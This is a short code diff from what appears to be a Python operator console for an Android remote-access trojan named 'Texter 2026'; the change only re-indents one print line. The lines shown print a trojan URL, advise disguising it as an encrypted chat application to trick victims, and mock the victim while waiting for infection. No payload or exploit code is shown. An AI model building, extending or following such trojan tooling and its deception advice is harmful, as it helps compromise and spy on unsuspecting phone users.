@@ -40,7 +40,7 @@ while True:
                                          NAME: Android Rat (Texter 2026)
 
                       """)
-                print(f"                                         {BLUE}The Trojans url:  {RESET}" + ar_link + f"\n {BLUE}Best way is to make them think it's a encrypted chatting application. {RESET}")
+                print(f"                                         {BLUE}The Trojans url:  {RESET}" + ar_link + f"\n                                          {BLUE}Best way is to make them think it's a encrypted chatting application. {RESET}")
                 print(f"                                         {RED}Dumbass has yet to open the trojan, waiting...{RESET}")
                 
         else:
